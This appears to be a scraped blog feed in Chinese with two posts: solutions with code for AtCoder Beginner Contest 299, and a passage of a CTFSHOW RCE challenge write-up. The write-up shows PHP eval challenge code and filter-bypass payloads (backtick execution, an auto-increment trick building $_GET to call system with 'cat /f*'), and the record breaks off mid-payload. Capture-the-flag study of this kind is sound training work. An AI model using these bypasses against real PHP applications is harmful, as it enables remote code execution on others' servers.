      <title>AtCoder Beginner Contest 299</title>
      <link href="/posts/ae73.html"/>
      <url>/posts/ae73.html</url>
      
        <content type="html"><![CDATA[<h1 id="AtCoder-Beginner-Contest-299"><a href="#AtCoder-Beginner-Contest-299" class="headerlink" title="AtCoder Beginner Contest 299"></a>AtCoder Beginner Contest 299</h1><h2 id="A-Treasure-Chest"><a href="#A-Treasure-Chest" class="headerlink" title="A - Treasure Chest"></a>A - Treasure Chest</h2><h3 id="题目大意"><a href="#题目大意" class="headerlink" title="题目大意"></a>题目大意</h3><p>给定一个包含 <code>|*.</code>的字符串，其中<code>|</code>两个，<code>*</code>一个，问<code>*</code>是否在两个<code>|</code>之间。</p><h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><p>找到两个<code>|</code>的下标<code>l，r</code>以及*的下标<code>mid</code>，看看是否满足 <code>l&lt; mid &lt; r</code>即可。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span> <span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line">    cin &gt;&gt; n;</span><br><span class="line">    string s;</span><br><span class="line">    cin &gt;&gt; s;</span><br><span class="line">    <span class="type">int</span> a = s.<span class="built_in">find</span>(<span class="string">&#x27;|&#x27;</span>);</span><br><span class="line">    <span class="type">int</span> b = s.<span class="built_in">find</span>(<span class="string">&#x27;|&#x27;</span>,a + <span class="number">1</span>);</span><br><span class="line">    <span class="type">int</span> c = s.<span class="built_in">find</span>(<span class="string">&#x27;*&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span>(c &gt; a &amp;&amp; c &lt; b) cout &lt;&lt; <span class="string">&quot;in&quot;</span>;</span><br><span class="line">    <span class="keyword">else</span> cout &lt;&lt; <span class="string">&quot;out&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="B-Trick-Taking"><a href="#B-Trick-Taking" class="headerlink" title="B - Trick Taking"></a>B - Trick Taking</h2><h3 id="题目大意-1"><a href="#题目大意-1" class="headerlink" title="题目大意"></a>题目大意</h3><p>给定n个人的卡片，颜色为 <code>c[i]</code> ，数字为 <code>r[i]</code> 。</p><p>如果其中有颜色为 T 的牌，则该颜色中数字最大的卡片对应的人赢。如果没有，则颜色为第一个人的卡牌颜（ 即<code>c[0]</code> ）中数字最大的卡片对应的人赢。问谁赢。</p><h3 id="解题思路-1"><a href="#解题思路-1" class="headerlink" title="解题思路"></a>解题思路</h3><p>分两种情况模拟即可。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"> </span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">2</span>*<span class="number">1e5</span>*<span class="number">10</span>;;</span><br><span class="line"><span class="type">int</span> c[N],r[N];</span><br><span class="line"><span class="type">int</span> n, t;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> res1 = <span class="number">0</span>;</span><br><span class="line">    <span class="type">bool</span> flag = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (c[i] == t)</span><br><span class="line">        &#123;</span><br><span class="line">            res1 = <span class="built_in">max</span>(res1, r[i]);</span><br><span class="line">            flag = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (flag)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (res1 == r[i])</span><br><span class="line">            &#123;</span><br><span class="line">                cout &lt;&lt; i + <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> res2 = r[<span class="number">0</span>];</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt; n; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (c[i] == c[<span class="number">0</span>])</span><br><span class="line">            &#123;</span><br><span class="line">                res2 = <span class="built_in">max</span>(res2, r[i]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (res2 == r[i])</span><br><span class="line">            &#123;</span><br><span class="line">                cout &lt;&lt; i + <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span> <span class="params">()</span></span>&#123;</span><br><span class="line">    cin &gt;&gt; n &gt;&gt; t;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)  cin &gt;&gt; c[i];</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)  cin &gt;&gt; r[i];</span><br><span class="line">    <span class="built_in">solve</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="C-Dango"><a href="#C-Dango" class="headerlink" title="C - Dango"></a>C - Dango</h2><h3 id="题目大意-2"><a href="#题目大意-2" class="headerlink" title="题目大意"></a>题目大意</h3><p>定义一种字符串<code>s</code>的等级X是一个正整数），满足仅包含<code>-o</code>，且头或尾仅一处为<code>-</code>，其余都为<code>o</code>。其等级X为<code>o</code>的数量。给定一个字符串T，问其子串的最大等级。</p><h3 id="解题思路-2"><a href="#解题思路-2" class="headerlink" title="解题思路"></a>解题思路</h3><p>依次遍历字符串T，遇到两个<code>-</code>时期间就有一个等级。</p><p>然后再考虑从头到第一个<code>-</code>的子串，从最后一个<code>-</code>到尾的子串的等级。</p><p>注意单纯的一个<code>-</code>并不是合法的（0不是正整数）。</p><h3 id="解题思路-3"><a href="#解题思路-3" class="headerlink" title="解题思路"></a>解题思路</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">N = <span class="built_in">int</span>(<span class="built_in">input</span>())</span><br><span class="line">S = <span class="built_in">input</span>()</span><br><span class="line"> </span><br><span class="line">S = S + <span class="string">&#x27;-&#x27;</span></span><br><span class="line">ans = -<span class="number">1</span></span><br><span class="line">j = -<span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(N+<span class="number">1</span>) :</span><br><span class="line">    <span class="keyword">if</span> S[i] == <span class="string">&#x27;-&#x27;</span> :</span><br><span class="line">        l = i - j - <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> l &gt; <span class="number">0</span> <span class="keyword">and</span> (j &gt;= <span class="number">0</span> <span class="keyword">or</span> i &lt; N) :</span><br><span class="line">            ans = <span class="built_in">max</span>(ans, l)</span><br><span class="line">        j = i</span><br><span class="line"><span class="built_in">print</span>(ans)</span><br></pre></td></tr></table></figure><h2 id="D-Find-by-Query-abc299-d"><a href="#D-Find-by-Query-abc299-d" class="headerlink" title="D - Find by Query (abc299 d)"></a>D - Find by Query (abc299 d)</h2><h3 id="题目大意-3"><a href="#题目大意-3" class="headerlink" title="题目大意"></a>题目大意</h3><p>交互题。这里有个长度为n的01字符串 s，其中$s1=0$，$sn=1$。你可以询问$si$的值。输出一个位置$p$满足$sp≠sp+1$。给定字符串长度n，你最多问20次。 $n&lt;=2×10^5$。</p><h3 id="解题思路-4"><a href="#解题思路-4" class="headerlink" title="解题思路"></a>解题思路</h3><p>感觉好像和某次 cf的交互题很像。</p><p>注意题意保证了$s1=0，sn=1$。</p><p>首先询问中间位置$mid=\frac{n}{2}$，如果$s{mid}=1$，由于sn=1，最坏情况很有可能这后半部份都是 1，显然我们不该去问。但因为$s_1=0，s_{mid}=1$，所以前半部份必定有一处$s_p=0,s_{p+1}=1$。 反之$s_{mid}=0$的情况同理。</p><p>这样，通过一次询问，我们可以把答案保证存在的区间砍半了。那最多砍$logn$次就找到结果了。由于 $n≤2×10^5$，所以不会超过20次。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">using</span> i64 = <span class="type">long</span> <span class="type">long</span>;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    std::ios::<span class="built_in">sync_with_stdio</span>(<span class="literal">false</span>);</span><br><span class="line">    std::cin.<span class="built_in">tie</span>(<span class="literal">nullptr</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="type">int</span> N;</span><br><span class="line">    std::cin &gt;&gt; N;</span><br><span class="line">    </span><br><span class="line">    <span class="type">int</span> l = <span class="number">1</span>, r = N;</span><br><span class="line">    <span class="keyword">while</span> (l &lt; r - <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="type">int</span> m = (l + r) / <span class="number">2</span>;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;? &quot;</span> &lt;&lt; m &lt;&lt; std::endl;</span><br><span class="line">        <span class="type">int</span> res;</span><br><span class="line">        std::cin &gt;&gt; res;</span><br><span class="line">        <span class="keyword">if</span> (res == <span class="number">1</span>) &#123;</span><br><span class="line">            r = m;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            l = m;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;! &quot;</span> &lt;&lt; l &lt;&lt; std::endl;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="解题思路-5"><a href="#解题思路-5" class="headerlink" title="解题思路"></a>解题思路</h3><h2 id="E-Nearest-Black-Vertex"><a href="#E-Nearest-Black-Vertex" class="headerlink" title="E - Nearest Black Vertex"></a>E - Nearest Black Vertex</h2><h3 id="题目大意-4"><a href="#题目大意-4" class="headerlink" title="题目大意"></a>题目大意</h3><p>给定一张图，要求给点涂黑白色，要求至少有一个黑点，且满足k个要求。</p><p>每个要求 $(p_i,d_i)$表示点 pi距离黑点的最近距离恰好为 $d_i$。</p><p>点数、边数 $≤2000$</p><h2 id="解题思路-6"><a href="#解题思路-6" class="headerlink" title="解题思路"></a>解题思路</h2><p>注意边数只有2000。</p><p>我们可以对每个要求的$p_i$进行BFS，把距离其小于d的点都标记为白色。</p><p>然后再对每个要求的 $p_i$进行 BFS，把距离其为d的且未被标记为白色的点标记为黑色。</p><p>如果有个要求没有找到可以被涂黑色的点，就无解了。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">using</span> i64 = <span class="type">long</span> <span class="type">long</span>;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    std::ios::<span class="built_in">sync_with_stdio</span>(<span class="literal">false</span>);</span><br><span class="line">    std::cin.<span class="built_in">tie</span>(<span class="literal">nullptr</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="type">int</span> N, M;</span><br><span class="line">    std::cin &gt;&gt; N &gt;&gt; M;</span><br><span class="line">    </span><br><span class="line">    std::vector&lt;std::vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">adj</span>(N);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; M; i++) &#123;</span><br><span class="line">        <span class="type">int</span> u, v;</span><br><span class="line">        std::cin &gt;&gt; u &gt;&gt; v;</span><br><span class="line">        u--, v--;</span><br><span class="line">        adj[u].<span class="built_in">push_back</span>(v);</span><br><span class="line">        adj[v].<span class="built_in">push_back</span>(u);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function">std::vector&lt;<span class="type">bool</span>&gt; <span class="title">black</span><span class="params">(N, <span class="literal">true</span>)</span></span>;</span><br><span class="line">    <span class="type">int</span> K;</span><br><span class="line">    std::cin &gt;&gt; K;</span><br><span class="line">    </span><br><span class="line">    <span class="function">std::vector&lt;<span class="type">int</span>&gt; <span class="title">p</span><span class="params">(K)</span>, <span class="title">d</span><span class="params">(K)</span></span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; K; i++) &#123;</span><br><span class="line">        std::cin &gt;&gt; p[i] &gt;&gt; d[i];</span><br><span class="line">        p[i]--;</span><br><span class="line">        </span><br><span class="line">        <span class="function">std::vector&lt;<span class="type">int</span>&gt; <span class="title">dis</span><span class="params">(N, <span class="number">-1</span>)</span></span>;</span><br><span class="line">        std::queue&lt;<span class="type">int</span>&gt; q;</span><br><span class="line">        dis[p[i]] = <span class="number">0</span>;</span><br><span class="line">        q.<span class="built_in">push</span>(p[i]);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">while</span> (!q.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">            <span class="type">int</span> x = q.<span class="built_in">front</span>();</span><br><span class="line">            q.<span class="built_in">pop</span>();</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> (dis[x] &lt; d[i]) &#123;</span><br><span class="line">                black[x] = <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">auto</span> y : adj[x]) &#123;</span><br><span class="line">                <span class="keyword">if</span> (dis[y] == <span class="number">-1</span>) &#123;</span><br><span class="line">                    dis[y] = dis[x] + <span class="number">1</span>;</span><br><span class="line">                    q.<span class="built_in">push</span>(y);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    std::queue&lt;<span class="type">int</span>&gt; q;</span><br><span class="line">    <span class="function">std::vector&lt;<span class="type">int</span>&gt; <span class="title">dis</span><span class="params">(N, <span class="number">-1</span>)</span></span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; N; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (black[i]) &#123;</span><br><span class="line">            q.<span class="built_in">push</span>(i);</span><br><span class="line">            dis[i] = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span> (!q.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">        <span class="type">int</span> x = q.<span class="built_in">front</span>();</span><br><span class="line">        q.<span class="built_in">pop</span>();</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span> y : adj[x]) &#123;</span><br><span class="line">            <span class="keyword">if</span> (dis[y] == <span class="number">-1</span>) &#123;</span><br><span class="line">                dis[y] = dis[x] + <span class="number">1</span>;</span><br><span class="line">                q.<span class="built_in">push</span>(y);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; K; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (dis[p[i]] != d[i]) &#123;</span><br><span class="line">            std::cout &lt;&lt; <span class="string">&quot;No\n&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Yes\n&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; N; i++) &#123;</span><br><span class="line">        std::cout &lt;&lt; black[i];</span><br><span class="line">    &#125;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="F-Square-Subsequence"><a href="#F-Square-Subsequence" class="headerlink" title="F - Square Subsequence"></a>F - Square Subsequence</h2><p>不会</p><h2 id="G-Minimum-Permutation"><a href="#G-Minimum-Permutation" class="headerlink" title="G - Minimum Permutation"></a>G - Minimum Permutation</h2><p>不会</p><h2 id="Ex-Dice-Sum-Infinity"><a href="#Ex-Dice-Sum-Infinity" class="headerlink" title="Ex - Dice Sum Infinity"></a>Ex - Dice Sum Infinity</h2><p>不会</p>]]></content>
      
      
      <categories>
          
          <category> OI </category>
          
      </categories>
      
      
        <tags>
            
            <tag> AtCoder Beginner Contest </tag>
            
            <tag> ACM </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTFSHOW RCE极限大挑战-Writeup</title>
      <link href="/posts/fa99.html"/>
      <url>/posts/fa99.html</url>
      
        <content type="html"><![CDATA[<h1 id="CTFSHOW-RCE极限挑战"><a href="#CTFSHOW-RCE极限挑战" class="headerlink" title="CTFSHOW RCE极限挑战"></a>CTFSHOW RCE极限挑战</h1><h2 id="RCE挑战1"><a href="#RCE挑战1" class="headerlink" title="RCE挑战1"></a>RCE挑战1</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$code</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$code</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;(&quot;</span>,<span class="string">&quot;括号&quot;</span>,<span class="variable">$code</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$code</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;.&quot;</span>,<span class="string">&quot;点&quot;</span>,<span class="variable">$code</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>过滤了’(‘和’.’，没过滤反引号，内联绕过。</p><p>playload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">code=echo `cat /f*`;</span><br></pre></td></tr></table></figure><h2 id="RCE挑战2"><a href="#RCE挑战2" class="headerlink" title="RCE挑战2"></a>RCE挑战2</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//本题灵感来自研究Y4tacker佬在吃瓜杯投稿的shellme时想到的姿势，太棒啦~。</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ctf_show&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$ctfshow</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ctf_show&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_string</span>(<span class="variable">$ctfshow</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-zA-Z0-9@#%^&amp;*:&#123;&#125;\-&lt;\?&gt;\&quot;|`~\\\\]/&quot;</span>,<span class="variable">$ctfshow</span>))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable">$ctfshow</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">&quot;Are you hacking me AGAIN?&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>自增绕过。</p><blockquote><p>fuzz后发现可用的可见字符有：</p><p>! $ ‘ ( ) + , . / ; = [ ] _</p></blockquote><p>exp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$_</span>=[];</span><br><span class="line"><span class="variable">$_</span> = <span class="string">&#x27;&#x27;</span>.<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$_</span>[<span class="string">&#x27;!&#x27;</span>==<span class="string">&#x27;;&#x27;</span>];</span><br><span class="line"><span class="variable">$_</span>++;<span class="variable">$_</span>++;</span><br><span class="line"><span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="comment">//E</span></span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$_</span>++;</span><br><span class="line"><span class="variable">$_</span>++;<span class="comment">//G</span></span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>.<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;</span><br><span class="line"><span class="variable">$_</span>++;<span class="variable">$_</span>++;</span><br><span class="line"><span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;</span><br><span class="line"><span class="variable">$_</span>++;</span><br><span class="line"><span class="variable">$_</span>++;<span class="comment">//T</span></span><br><span class="line"><span class="variable">$__</span>=<span class="string">&#x27;_&#x27;</span>.<span class="variable">$__</span>.<span class="variable">$_</span>;</span><br><span class="line">(<span class="variable">$$__</span>[<span class="string">&#x27;_&#x27;</span>])(<span class="variable">$$__</span>[<span class="string">&#x27;__&#x27;</span>]);<span class="comment">//($_GET[&#x27;_&#x27;])($_GET[&#x27;__&#x27;])</span></span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?_=system&amp;__=cat /f*</span><br><span 